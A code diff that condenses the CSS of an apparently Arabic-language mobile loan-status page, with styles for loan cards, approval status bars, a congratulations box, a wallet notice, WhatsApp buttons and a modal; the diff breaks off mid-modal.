@@ -7,857 +7,137 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
-            --primary: #2ECC71;
-            --primary-dark: #27AE60;
-            --gold: #D4AF37;
-            --gold-dark: #B8960F;
-            --bg-dark: #0A0F1A;
-            --bg-card: #0F1625;
-            --text-light: #F8FAFC;
-            --text-muted: #8899AA;
-            --border-color: #1E2A3A;
-            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-            --whatsapp: #25D366;
-            --whatsapp-dark: #128C7E;
-            --danger: #EF4444;
-            --warning: #FF8C42;
-        }
-
-        body {
-            font-family: 'Cairo', sans-serif;
-            background: var(--bg-dark);
-            color: var(--text-light);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 0.8rem;
-        }
-
-        .app-container {
-            max-width: 420px;
-            width: 100%;
-            background: var(--bg-card);
-            border-radius: 1.8rem;
-            padding: 1.2rem 1rem;
-            box-shadow: var(--shadow);
-            border: 1px solid var(--border-color);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .app-container::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(ellipse at 30% 20%, rgba(46, 204, 113, 0.03), transparent 60%);
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding-bottom: 0.8rem;
-            border-bottom: 1px solid var(--border-color);
-            position: relative;
-            z-index: 1;
-        }
-
-        .header .brand {
-            display: flex;
-            align-items: center;
-            gap: 0.4rem;
-        }
-
-        .header .brand .icon {
-            width: 36px;
-            height: 36px;
-            background: linear-gradient(135deg, var(--primary), var(--gold));
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.2rem;
-            color: #0A0F1A;
-            font-weight: 900;
-        }
-
-        .header .brand h1 {
-            font-size: 1.2rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #FFF, var(--primary), var(--gold));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .header .brand h1 span {
-            color: var(--gold);
-            -webkit-text-fill-color: var(--gold);
-        }
-
-        .header .badge {
-            background: rgba(46, 204, 113, 0.12);
-            border: 1px solid rgba(46, 204, 113, 0.2);
-            border-radius: 2rem;
-            padding: 0.2rem 0.6rem;
-            font-size: 0.55rem;
-            color: var(--primary);
-            display: flex;
-            align-items: center;
-            gap: 0.3rem;
-        }
-
-        .header .badge i {
-            font-size: 0.4rem;
-        }
-
-        .nav-tabs {
-            display: flex;
-            gap: 0.3rem;
-            margin: 0.8rem 0 1rem 0;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 2rem;
-            padding: 0.25rem;
-            position: relative;
-            z-index: 1;
-            border: 1px solid var(--border-color);
-        }
-
-        .nav-tabs .tab {
-            flex: 1;
-            text-align: center;
-            padding: 0.4rem 0.2rem;
-            border-radius: 2rem;
-            font-size: 0.65rem;
-            font-weight: 600;
-            color: var(--text-muted);
-            cursor: default;
-            transition: 0.2s;
-            background: transparent;
-        }
-
-        .nav-tabs .tab.active {
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: #0A0F1A;
-            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.25);
-        }
-
-        .nav-tabs .tab i {
-            margin-left: 0.2rem;
-        }
-
-        .search-box {
-            display: flex;
-            gap: 0.4rem;
-            margin: 0.6rem 0 0.8rem 0;
-            position: relative;
-            z-index: 1;
-        }
-
-        .search-box input {
-            flex: 1;
-            padding: 0.7rem 1rem;
-            border-radius: 2rem;
-            border: 2px solid var(--border-color);
-            background: rgba(255, 255, 255, 0.04);
-            color: white;
-            font-size: 0.85rem;
-            text-align: center;
-            transition: 0.2s;
-            font-family: 'Cairo', sans-serif;
-        }
-
-        .search-box input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 20px rgba(46, 204, 113, 0.1);
-        }
-
-        .search-box input::placeholder {
-            color: var(--text-muted);
-        }
-
-        .search-box button {
-            padding: 0.7rem 1.2rem;
-            border: none;
-            border-radius: 2rem;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: #0A0F1A;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.2s;
-            font-family: 'Cairo', sans-serif;
-            font-size: 0.8rem;
-            display: flex;
-            align-items: center;
-            gap: 0.3rem;
-            white-space: nowrap;
-        }
-
-        .search-box button:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(46, 204, 113, 0.25);
-        }
-
-        .loan-card {
-            background: linear-gradient(145deg, #111B2B, #0A1220);
-            border-radius: 1.2rem;
-            padding: 1.2rem 1rem;
-            border: 1px solid var(--border-color);
-            margin-bottom: 0.8rem;
-            position: relative;
-            z-index: 1;
-        }
-
-        .loan-card .loan-label {
-            font-size: 0.7rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            text-align: center;
-        }
-
-        .loan-card .loan-amount-main {
-            text-align: center;
-            font-size: 2.6rem;
-            font-weight: 900;
-            color: #FFF;
-            margin: 0.2rem 0;
-            letter-spacing: 1px;
-        }
-
-        .loan-card .loan-amount-main .currency {
-            font-size: 1.2rem;
-            color: var(--text-muted);
-            font-weight: 600;
-        }
-
-        .loan-card .loan-percent {
-            text-align: center;
-            font-size: 0.9rem;
-            color: var(--gold);
-            font-weight: 700;
-        }
-
-        .loan-card .loan-percent i {
-            color: var(--gold);
-            margin-left: 0.3rem;
-        }
-
-        .loan-details-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr 1fr;
-            gap: 0.5rem;
-            margin-top: 0.8rem;
-            padding-top: 0.8rem;
-            border-top: 1px solid var(--border-color);
-        }
-
-        .loan-details-grid .detail-item {
-            text-align: center;
-        }
-
-        .loan-details-grid .detail-item .label {
-            font-size: 0.5rem;
-            color: var(--text-muted);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .loan-details-grid .detail-item .value {
-            font-size: 0.9rem;
-            font-weight: 700;
-            color: #FFF;
-            margin-top: 0.1rem;
-        }
-
-        .loan-details-grid .detail-item .value.gold {
-            color: var(--gold);
-        }
-
-        .loan-details-grid .detail-item .value.green {
-            color: var(--primary);
-        }
-
-        .loan-details-grid .detail-item .value.danger {
-            color: var(--danger);
-        }
-
-        .loan-details-grid .detail-item .value.warning {
-            color: var(--warning);
-        }
-
-        /* ===== شريط الحالة ===== */
-        .status-bar {
-            display: flex;
-            align-items: center;
-            gap: 0.6rem;
-            background: rgba(255, 255, 255, 0.03);
-            border-radius: 1.2rem;
-            padding: 0.5rem 0.8rem;
-            border: 1px solid var(--border-color);
-            margin: 0.6rem 0;
-        }
-
-        .status-bar .status-icon {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 0.85rem;
-            flex-shrink: 0;
-        }
-
-        .status-bar .status-text {
-            flex: 1;
-        }
-
-        .status-bar .status-text .main {
-            font-weight: 700;
-            font-size: 0.85rem;
-        }
-
-        .status-bar .status-text .sub {
-            font-size: 0.6rem;
-            color: var(--text-muted);
-        }
-
-        .status-bar .status-badge {
-            border-radius: 2rem;
-            padding: 0.15rem 0.6rem;
-            font-size: 0.55rem;
-            font-weight: 600;
-        }
-
-        .status-bar.approved .status-icon {
-            background: rgba(46, 204, 113, 0.12);
-            color: var(--primary);
-        }
-        .status-bar.approved .status-badge {
-            background: rgba(46, 204, 113, 0.12);
-            border: 1px solid rgba(46, 204, 113, 0.2);
-            color: var(--primary);
-        }
-
-        .status-bar.review .status-icon {
-            background: rgba(255, 140, 66, 0.12);
-            color: var(--warning);
-        }
-        .status-bar.review .status-badge {
-            background: rgba(255, 140, 66, 0.12);
-            border: 1px solid rgba(255, 140, 66, 0.2);
-            color: var(--warning);
-        }
-
-        .status-bar.rejected .status-icon {
-            background: rgba(239, 68, 68, 0.12);
-            color: var(--danger);
-        }
-        .status-bar.rejected .status-badge {
-            background: rgba(239, 68, 68, 0.12);
-            border: 1px solid rgba(239, 68, 68, 0.2);
-            color: var(--danger);
-        }
-
-        .status-bar.warning .status-icon {
-            background: rgba(212, 175, 55, 0.12);
-            color: var(--gold);
-        }
-        .status-bar.warning .status-badge {
-            background: rgba(212, 175, 55, 0.12);
-            border: 1px solid rgba(212, 175, 55, 0.2);
-            color: var(--gold);
-        }
-
-        .client-info {
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 1rem;
-            padding: 0.6rem 0.8rem;
-            border: 1px solid var(--border-color);
-            margin: 0.6rem 0;
-        }
-
-        .client-info .row {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.25rem 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
-            font-size: 0.75rem;
-        }
-
-        .client-info .row:last-child {
-            border-bottom: none;
-        }
-
-        .client-info .row .key {
-            color: var(--text-muted);
-        }
-
-        .client-info .row .value {
-            font-weight: 600;
-            text-align: left;
-            color: #FFF;
-        }
-
-        .client-info .row .value.gold {
-            color: var(--gold);
-        }
-
-        .client-info .row .value.green {
-            color: var(--primary);
-        }
-
-        .client-info .row .value.danger {
-            color: var(--danger);
-        }
-
-        .client-info .row .value.warning {
-            color: var(--warning);
-        }
-
-        .congrats-box {
-            background: linear-gradient(135deg, rgba(46, 204, 113, 0.08), rgba(212, 175, 55, 0.05));
-            border: 2px solid var(--gold);
-            border-radius: 1.2rem;
-            padding: 0.8rem;
-            text-align: center;
-            margin: 0.6rem 0;
-            animation: glowPulse 2s ease-in-out infinite;
-            position: relative;
-            overflow: hidden;
-        }
-
-        @keyframes glowPulse {
-            0%,
-            100% { box-shadow: 0 0 15px rgba(212, 175, 55, 0.1); }
-            50% { box-shadow: 0 0 35px rgba(212, 175, 55, 0.25), 0 0 60px rgba(46, 204, 113, 0.1); }
-        }
-
-        .congrats-box::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: conic-gradient(from 0deg, transparent, rgba(212, 175, 55, 0.05), transparent, rgba(46, 204, 113, 0.05), transparent);
-            animation: rotateGlow 6s linear infinite;
-        }
-
-        @keyframes rotateGlow {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .congrats-box .icon-big {
-            font-size: 2.8rem;
-            display: inline-block;
-            animation: bounceStar 1.2s ease-in-out infinite;
-            position: relative;
-            z-index: 1;
-        }
-
-        @keyframes bounceStar {
-            0%, 100% { transform: scale(1) rotate(0deg); }
-            25% { transform: scale(1.15) rotate(8deg); }
-            75% { transform: scale(0.95) rotate(-5deg); }
-        }
-
-        .congrats-box h3 {
-            font-size: 1.2rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, var(--gold), #FFD700, var(--primary));
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            position: relative;
-            z-index: 1;
-            margin: 0.2rem 0;
-        }
-
-        .congrats-box p {
-            color: var(--text-muted);
-            font-size: 0.75rem;
-            position: relative;
-            z-index: 1;
-        }
-
-        .congrats-box .approved-amount {
-            display: inline-block;
-            background: rgba(212, 175, 55, 0.12);
-            border: 2px solid var(--gold);
-            border-radius: 2rem;
-            padding: 0.3rem 1.2rem;
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: var(--gold);
-            position: relative;
-            z-index: 1;
-            margin: 0.3rem 0;
-        }
-
-        .wallet-notice {
-            background: rgba(0, 191, 255, 0.08);
-            border: 2px solid #00BFFF;
-            border-radius: 1.2rem;
-            padding: 0.8rem;
-            margin: 0.6rem 0;
-        }
-
-        .wallet-notice .notice-head {
-            display: flex;
-            align-items: center;
-            gap: 0.6rem;
-            margin-bottom: 0.3rem;
-        }
-
-        .wallet-notice .notice-head i {
-            font-size: 1.6rem;
-            color: #00BFFF;
-        }
-
-        .wallet-notice .notice-head h4 {
-            color: #00BFFF;
-            font-size: 0.9rem;
-        }
-
-        .wallet-notice p {
-            color: var(--text-muted);
-            font-size: 0.75rem;
-            line-height: 1.7;
-        }
-
-        .wallet-notice .highlight-blue {
-            color: #00BFFF;
-            font-weight: 700;
-        }
-
-        .wallet-notice .highlight-gold {
-            color: var(--gold);
-            font-weight: 700;
-        }
-
-        .btn-whatsapp {
-            width: 100%;
-            padding: 0.7rem;
-            border: none;
-            border-radius: 2rem;
-            background: linear-gradient(135deg, #25D366, #128C7E);
-            color: white;
-            font-weight: 800;
-            font-size: 0.85rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.25);
-            margin-top: 0.4rem;
-        }
-
-        .btn-whatsapp:hover {
-            transform: scale(1.02);
-            box-shadow: 0 0 30px rgba(37, 211, 102, 0.4);
-        }
-
-        .btn-whatsapp.gold-btn {
-            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
-            box-shadow: 0 4px 20px rgba(212, 175, 55, 0.25);
-        }
-
-        .btn-whatsapp.gold-btn:hover {
-            box-shadow: 0 0 30px rgba(212, 175, 55, 0.4);
-        }
-
-        .btn-whatsapp.etisalat-btn {
-            background: linear-gradient(135deg, #00BFFF, #0099CC);
-            box-shadow: 0 4px 20px rgba(0, 191, 255, 0.2);
-        }
-
-        .btn-whatsapp.etisalat-btn:hover {
-            box-shadow: 0 0 30px rgba(0, 191, 255, 0.35);
-        }
-
-        .btn-whatsapp.danger-btn {
-            background: linear-gradient(135deg, var(--danger), #C0392B);
-            box-shadow: 0 4px 20px rgba(239, 68, 68, 0.2);
-        }
-
-        .btn-whatsapp.danger-btn:hover {
-            box-shadow: 0 0 30px rgba(239, 68, 68, 0.35);
-        }
-
-        .error-box {
-            background: rgba(239, 68, 68, 0.08);
-            border: 1px solid #EF4444;
-            border-radius: 1rem;
-            padding: 0.8rem;
-            text-align: center;
-            color: #EF4444;
-            font-size: 0.8rem;
-            display: none;
-            margin-top: 0.6rem;
-        }
-
-        .loader {
-            text-align: center;
-            display: none;
-            padding: 0.8rem 0;
-        }
-
-        .loader i {
-            color: var(--primary);
-            font-size: 1.5rem;
-        }
-
-        .loader p {
-            color: var(--text-muted);
-            font-size: 0.7rem;
-            margin-top: 0.2rem;
-        }
+            --primary: #2ECC71; --primary-dark: #27AE60;
+            --gold: #D4AF37; --gold-dark: #B8960F;
+            --bg-dark: #0A0F1A; --bg-card: #0F1625;
+            --text-light: #F8FAFC; --text-muted: #8899AA;
+            --border-color: #1E2A3A; --shadow: 0 8px 32px rgba(0,0,0,0.4);
+            --whatsapp: #25D366; --danger: #EF4444; --warning: #FF8C42;
+        }
+        body { font-family: 'Cairo', sans-serif; background: var(--bg-dark); color: var(--text-light); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 0.8rem; }
+        .app-container { max-width: 420px; width: 100%; background: var(--bg-card); border-radius: 1.8rem; padding: 1.2rem 1rem; box-shadow: var(--shadow); border: 1px solid var(--border-color); position: relative; overflow: hidden; }
+        .app-container::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(ellipse at 30% 20%, rgba(46,204,113,0.03), transparent 60%); pointer-events: none; z-index: 0; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 0.8rem; border-bottom: 1px solid var(--border-color); position: relative; z-index: 1; }
+        .header .brand { display: flex; align-items: center; gap: 0.4rem; cursor: pointer; }
+        .header .brand .icon { width: 36px; height: 36px; background: linear-gradient(135deg, var(--primary), var(--gold)); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 1.2rem; color: #0A0F1A; font-weight: 900; }
+        .header .brand h1 { font-size: 1.2rem; font-weight: 800; background: linear-gradient(135deg, #FFF, var(--primary), var(--gold)); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .header .brand h1 span { color: var(--gold); -webkit-text-fill-color: var(--gold); }
+        .header .badge { background: rgba(46,204,113,0.12); border: 1px solid rgba(46,204,113,0.2); border-radius: 2rem; padding: 0.2rem 0.6rem; font-size: 0.55rem; color: var(--primary); display: flex; align-items: center; gap: 0.3rem; }
+        .header .badge i { font-size: 0.4rem; }
+        .nav-tabs { display: flex; gap: 0.3rem; margin: 0.8rem 0 1rem 0; background: rgba(255,255,255,0.03); border-radius: 2rem; padding: 0.25rem; position: relative; z-index: 1; border: 1px solid var(--border-color); }
+        .nav-tabs .tab { flex: 1; text-align: center; padding: 0.4rem 0.2rem; border-radius: 2rem; font-size: 0.65rem; font-weight: 600; color: var(--text-muted); cursor: default; transition: 0.2s; background: transparent; }
+        .nav-tabs .tab.active { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #0A0F1A; box-shadow: 0 4px 15px rgba(46,204,113,0.25); }
+        .nav-tabs .tab i { margin-left: 0.2rem; }
+        .search-box { display: flex; gap: 0.4rem; margin: 0.6rem 0 0.8rem 0; position: relative; z-index: 1; }
+        .search-box input { flex: 1; padding: 0.7rem 1rem; border-radius: 2rem; border: 2px solid var(--border-color); background: rgba(255,255,255,0.04); color: white; font-size: 0.85rem; text-align: center; transition: 0.2s; font-family: 'Cairo', sans-serif; }
+        .search-box input:focus { outline: none; border-color: var(--primary); box-shadow: 0 0 20px rgba(46,204,113,0.1); }
+        .search-box input::placeholder { color: var(--text-muted); }
+        .search-box button { padding: 0.7rem 1.2rem; border: none; border-radius: 2rem; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: #0A0F1A; font-weight: 800; cursor: pointer; transition: 0.2s; font-family: 'Cairo', sans-serif; font-size: 0.8rem; display: flex; align-items: center; gap: 0.3rem; white-space: nowrap; }
+        .search-box button:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(46,204,113,0.25); }
+
+        .loan-card { background: linear-gradient(145deg, #111B2B, #0A1220); border-radius: 1.2rem; padding: 1.2rem 1rem; border: 1px solid var(--border-color); margin-bottom: 0.8rem; position: relative; z-index: 1; }
+        .loan-card .loan-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; text-align: center; }
+        .loan-card .loan-amount-main { text-align: center; font-size: 2.6rem; font-weight: 900; color: #FFF; margin: 0.2rem 0; letter-spacing: 1px; }
+        .loan-card .loan-amount-main .currency { font-size: 1.2rem; color: var(--text-muted); font-weight: 600; }
+        .loan-card .loan-percent { text-align: center; font-size: 0.9rem; color: var(--gold); font-weight: 700; }
+        .loan-card .loan-percent i { color: var(--gold); margin-left: 0.3rem; }
+        .loan-details-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.5rem; margin-top: 0.8rem; padding-top: 0.8rem; border-top: 1px solid var(--border-color); }
+        .loan-details-grid .detail-item { text-align: center; }
+        .loan-details-grid .detail-item .label { font-size: 0.5rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.5px; }
+        .loan-details-grid .detail-item .value { font-size: 0.9rem; font-weight: 700; color: #FFF; margin-top: 0.1rem; }
+        .loan-details-grid .detail-item .value.gold { color: var(--gold); }
+        .loan-details-grid .detail-item .value.green { color: var(--primary); }
+        .loan-details-grid .detail-item .value.danger { color: var(--danger); }
+        .loan-details-grid .detail-item .value.warning { color: var(--warning); }
+
+        .status-bar { display: flex; align-items: center; gap: 0.6rem; background: rgba(255,255,255,0.03); border-radius: 1.2rem; padding: 0.5rem 0.8rem; border: 1px solid var(--border-color); margin: 0.6rem 0; }
+        .status-bar .status-icon { width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.85rem; flex-shrink: 0; }
+        .status-bar .status-text { flex: 1; }
+        .status-bar .status-text .main { font-weight: 700; font-size: 0.85rem; }
+        .status-bar .status-text .sub { font-size: 0.6rem; color: var(--text-muted); }
+        .status-bar .status-badge { border-radius: 2rem; padding: 0.15rem 0.6rem; font-size: 0.55rem; font-weight: 600; }
+        .status-bar.approved .status-icon { background: rgba(46,204,113,0.12); color: var(--primary); }
+        .status-bar.approved .status-badge { background: rgba(46,204,113,0.12); border: 1px solid rgba(46,204,113,0.2); color: var(--primary); }
+        .status-bar.review .status-icon { background: rgba(255,140,66,0.12); color: var(--warning); }
+        .status-bar.review .status-badge { background: rgba(255,140,66,0.12); border: 1px solid rgba(255,140,66,0.2); color: var(--warning); }
+        .status-bar.rejected .status-icon { background: rgba(239,68,68,0.12); color: var(--danger); }
+        .status-bar.rejected .status-badge { background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.2); color: var(--danger); }
+        .status-bar.warning .status-icon { background: rgba(212,175,55,0.12); color: var(--gold); }
+        .status-bar.warning .status-badge { background: rgba(212,175,55,0.12); border: 1px solid rgba(212,175,55,0.2); color: var(--gold); }
+
+        .client-info { background: rgba(255,255,255,0.02); border-radius: 1rem; padding: 0.6rem 0.8rem; border: 1px solid var(--border-color); margin: 0.6rem 0; }
+        .client-info .row { display: flex; justify-content: space-between; padding: 0.25rem 0; border-bottom: 1px solid rgba(255,255,255,0.03); font-size: 0.75rem; }
+        .client-info .row:last-child { border-bottom: none; }
+        .client-info .row .key { color: var(--text-muted); }
+        .client-info .row .value { font-weight: 600; text-align: left; color: #FFF; }
+        .client-info .row .value.gold { color: var(--gold); }
+        .client-info .row .value.green { color: var(--primary); }
+        .client-info .row .value.danger { color: var(--danger); }
+        .client-info .row .value.warning { color: var(--warning); }
+
+        .congrats-box { background: linear-gradient(135deg, rgba(46,204,113,0.08), rgba(212,175,55,0.05)); border: 2px solid var(--gold); border-radius: 1.2rem; padding: 0.8rem; text-align: center; margin: 0.6rem 0; animation: glowPulse 2s ease-in-out infinite; position: relative; overflow: hidden; }
+        @keyframes glowPulse { 0%,100% { box-shadow: 0 0 15px rgba(212,175,55,0.1); } 50% { box-shadow: 0 0 35px rgba(212,175,55,0.25), 0 0 60px rgba(46,204,113,0.1); } }
+        .congrats-box::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(from 0deg, transparent, rgba(212,175,55,0.05), transparent, rgba(46,204,113,0.05), transparent); animation: rotateGlow 6s linear infinite; }
+        @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .congrats-box .icon-big { font-size: 2.8rem; display: inline-block; animation: bounceStar 1.2s ease-in-out infinite; position: relative; z-index: 1; }
+        @keyframes bounceStar { 0%,100% { transform: scale(1) rotate(0deg); } 25% { transform: scale(1.15) rotate(8deg); } 75% { transform: scale(0.95) rotate(-5deg); } }
+        .congrats-box h3 { font-size: 1.2rem; font-weight: 800; background: linear-gradient(135deg, var(--gold), #FFD700, var(--primary)); -webkit-background-clip: text; background-clip: text; color: transparent; position: relative; z-index: 1; margin: 0.2rem 0; }
+        .congrats-box p { color: var(--text-muted); font-size: 0.75rem; position: relative; z-index: 1; }
+        .congrats-box .approved-amount { display: inline-block; background: rgba(212,175,55,0.12); border: 2px solid var(--gold); border-radius: 2rem; padding: 0.3rem 1.2rem; font-size: 1.4rem; font-weight: 800; color: var(--gold); position: relative; z-index: 1; margin: 0.3rem 0; }
+
+        .wallet-notice { background: rgba(0,191,255,0.08); border: 2px solid #00BFFF; border-radius: 1.2rem; padding: 0.8rem; margin: 0.6rem 0; }
+        .wallet-notice .notice-head { display: flex; align-items: center; gap: 0.6rem; margin-bottom: 0.3rem; }
+        .wallet-notice .notice-head i { font-size: 1.6rem; color: #00BFFF; }
+        .wallet-notice .notice-head h4 { color: #00BFFF; font-size: 0.9rem; }
+        .wallet-notice p { color: var(--text-muted); font-size: 0.75rem; line-height: 1.7; }
+        .wallet-notice .highlight-blue { color: #00BFFF; font-weight: 700; }
+        .wallet-notice .highlight-gold { color: var(--gold); font-weight: 700; }
+
+        .btn-whatsapp { width: 100%; padding: 0.7rem; border: none; border-radius: 2rem; background: linear-gradient(135deg, #25D366, #128C7E); color: white; font-weight: 800; font-size: 0.85rem; display: flex; align-items: center; justify-content: center; gap: 0.5rem; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 20px rgba(37,211,102,0.25); margin-top: 0.4rem; }
+        .btn-whatsapp:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(37,211,102,0.4); }
+        .btn-whatsapp.gold-btn { background: linear-gradient(135deg, var(--gold), var(--gold-dark)); box-shadow: 0 4px 20px rgba(212,175,55,0.25); }
+        .btn-whatsapp.gold-btn:hover { box-shadow: 0 0 30px rgba(212,175,55,0.4); }
+        .btn-whatsapp.etisalat-btn { background: linear-gradient(135deg, #00BFFF, #0099CC); box-shadow: 0 4px 20px rgba(0,191,255,0.2); }
+        .btn-whatsapp.etisalat-btn:hover { box-shadow: 0 0 30px rgba(0,191,255,0.35); }
+        .btn-whatsapp.danger-btn { background: linear-gradient(135deg, var(--danger), #C0392B); box-shadow: 0 4px 20px rgba(239,68,68,0.2); }
+        .btn-whatsapp.danger-btn:hover { box-shadow: 0 0 30px rgba(239,68,68,0.35); }
+
+        .error-box { background: rgba(239,68,68,0.08); border: 1px solid #EF4444; border-radius: 1rem; padding: 0.8rem; text-align: center; color: #EF4444; font-size: 0.8rem; display: none; margin-top: 0.6rem; }
+        .loader { text-align: center; display: none; padding: 0.8rem 0; }
+        .loader i { color: var(--primary); font-size: 1.5rem; }
+        .loader p { color: var(--text-muted); font-size: 0.7rem; margin-top: 0.2rem; }
 
         /* ===== مودال ===== */
-        .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            backdrop-filter: blur(12px);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            animation: fadeIn 0.3s ease;
-        }
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); backdrop-filter: blur(12px); z-index: 1000; justify-content: center; align-items: center; animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .modal-container { background: var(--bg-card); border-radius: 1.8rem; max-width: 420px; width: 90%; max-height: 90vh; overflow-y: auto; border: 1px solid var(--gold); box-shadow: 0 0 40px rgba(212,175,55,0.15); animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .modal-header { padding: 0.8rem; text-align: center; border-bottom: 1px solid var(--border-color); background: rgba(212,175,55,0.04); border-radius: 1.8rem 1.8rem 0 0; }
+        .modal-header h3 { color: var(--gold); font-size: 1.1rem; }
+        .modal-body { padding: 1rem; }
+        .modal-body .celebration { text-align: center; padding: 0.8rem 0; }
+        .modal-body .celebration .big-icon { font-size: 3rem; color: var(--gold); animation: bounce 1s ease-in-out infinite; }
+        @keyframes bounce { 0%,100% { transform: scale(1); } 50% { transform: scale(1.15); } }
+        .modal-body .celebration h2 { font-size: 1.3rem; background: linear-gradient(135deg, var(--gold), #FFD700); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 0.3rem 0; }
+        .modal-body .celebration .loan-badge { display: inline-block; background: rgba(212,175,55,0.12); border: 2px solid var(--gold); border-radius: 2rem; padding: 0.3rem 1.2rem; font-size: 1.4rem; font-weight: 800; color: var(--gold); margin: 0.3rem 0; }
+        .modal-footer { padding: 0.8rem; border-top: 1px solid var(--border-color); text-align: center; }
+        .modal-footer .btn-modal-whatsapp { width: 100%; padding: 0.7rem; border: none; border-radius: 2rem; background: linear-gradient(135deg, #25D366, #128C7E); color: white; font-weight: 800; font-size: 0.85rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; transition: 0.2s; }
+        .modal-footer .btn-modal-whatsapp:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(37,211,102,0.35); }
+        .modal-footer .close-modal-btn { background: transparent; border: none; color: var(--text-muted); margin-top: 0.5rem; cursor: pointer; font-size: 0.75rem; }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .modal-container {
-            background: var(--bg-card);
-            border-radius: 1.8rem;
-            max-width: 420px;
-            width: 90%;
-            max-height: 90vh;
-            overflow-y: auto;
-            border: 1px solid var(--gold);
-            box-shadow: 0 0 40px rgba(212, 175, 55, 0.15);
-            animation: slideUp 0.3s ease;
-        }
-
-        @keyframes slideUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .modal-header {
-            padding: 0.8rem;
-            text-align: center;
-            border-bottom: 1px solid var(--border-color);
-            background: rgba(212, 175, 55, 0.04);
-            border-radius: 1.8rem 1.8rem 0 0;
-        }
-
-        .modal-header h3 {
-            color: var(--gold);
-            font-size: 1.1rem;
-        }
-
-        .modal-body {
-            padding: 1rem;
-        }
-
-        .modal-body .celebration {
-            text-align: center;
-            padding: 0.8rem 0;
-        }
-
-        .modal-body .celebration .big-icon {
-            font-size: 3rem;
-            color: var(--gold);
-            animation: bounce 1s ease-in-out infinite;
-        }
-
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.15); }
-        }
-
-        .modal-body .celebration h2 {
-            font-size: 1.3rem;
-            background: linear-gradient(135deg, var(--gold), #FFD700);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin: 0.3rem 0;
-        }
-
-        .modal-body .celebration .loan-badge {
-            display: inline-block;
-            background: rgba(212, 175, 55, 0.12);
-            border: 2px solid var(--gold);
